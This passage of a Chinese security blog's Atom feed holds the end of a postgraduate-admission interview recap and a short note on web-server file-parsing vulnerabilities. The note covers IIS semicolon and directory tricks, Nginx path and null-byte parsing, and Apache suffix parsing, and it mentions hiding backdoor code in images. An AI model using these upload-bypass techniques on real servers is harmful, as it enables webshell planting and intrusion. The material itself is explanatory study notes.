school?</p><p>都比较简单，老考点了。</p><p>下面就开始拷问了，专业知识问了软件测试的四个过程，黑盒测试和白盒测试的区别，因为我本科是软件工程，问我凭什么报信息安全（？）我说我自己本科主动学习相关知识等。</p><p>安全开发的经历、这个短期实习你觉得你都收获了什么东西？</p><p>美赛主要负责哪些内容？</p><p>接下来老师问我更偏向纯技术还是部分技术+social，我选择了前者。</p><p>最后老师问我目前的主攻方向是什么，我BB了一堆打太极，最后老师又问，我破防了，遂说Web安全/渗透测试。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>保研既有实力也有运气，祝大家好运。</strong></p><p>不能保证好运的前提下请尽量提升自我，因为在面试中不一定会遇到什么问题，请完善简历，务必对简历上的每一个问题都熟悉。</p><p>当你觉得晚了的时候开始，恰恰是最早的时候，<strong>现在开始，一切不晚</strong>。</p><p>学会社交，学会问问题，学会和老师沟通交流，决定鸽的时候要尽量尽早，就算不能早鸽也一定提前和老师说明情况，大多数老师会理解。一定处理好和学校的关系，这不仅关乎你，更关乎你的学弟学妹。</p><h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><p><strong>个人VX:ab444o 欢迎师弟师妹交流保研相关问题~</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;现在是2020年10月12日下午18点19分，我于今天上午收到了来自电子科技大学的录取通知，确定后，意味着保研之旅正式结束。</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>解析漏洞小结</title>
    <link href="https://polosec.github.io/2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>https://polosec.github.io/2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</id>
    <published>2020-06-20T14:49:06.000Z</published>
    <updated>2020-06-20T15:14:07.769Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.jianshu.com/p/a1fa305a6b8f">https://www.jianshu.com/p/a1fa305a6b8f</a></p><h1 id="IIS5-6解析漏洞"><a href="#IIS5-6解析漏洞" class="headerlink" title="IIS5/6解析漏洞"></a>IIS5/6解析漏洞</h1><p>目录解析:在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被IIS当作可执行文件来解析并执行。<br>比如 <a href="http://www.baidu.com/1.asp/1.jpg">www.baidu.com/1.asp/1.jpg</a><br>文件解析:在IIS6.0下，分号后面的不被解析，也就是说6.0下，分号后面的不被解析，也就是说xx.asp;.jpg将被当做xx.asp解析并执行。<br><a href="http://www.xxx.com/xx.asp;.jpg">http://www.xxx.com/xx.asp;.jpg</a><br>IIS6.0 默认的可执行文件有asp、asa、cer、cdx四种。</p><h1 id="IIS-7-0-IIS-7-5-Nginx-lt-0-8-3畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-0-8-3畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞"></a>IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.PHP会将 /xx.jpg/xx.php 解析为 php 文件。<br>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾</p><h1 id="Nginx-lt-0-8-37-解析漏洞"><a href="#Nginx-lt-0-8-37-解析漏洞" class="headerlink" title="Nginx &lt;=0.8.37 解析漏洞"></a>Nginx &lt;=0.8.37 解析漏洞</h1><p>00截断<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞<br>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p><h1 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h1><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3 则会被解析为php</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.jianshu.com/p/a1fa305a6b8f&quot;&gt;https://www.jianshu.com/p/a1fa305a6b8f&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;IIS5-6解析漏洞&quot;&gt;&lt;a href=&quot;#II</summary>
      
    
    
    
    
    <category term="web" scheme="https://polosec.github.io/tags/web/"/>
    
  </entry>
  
</feed>
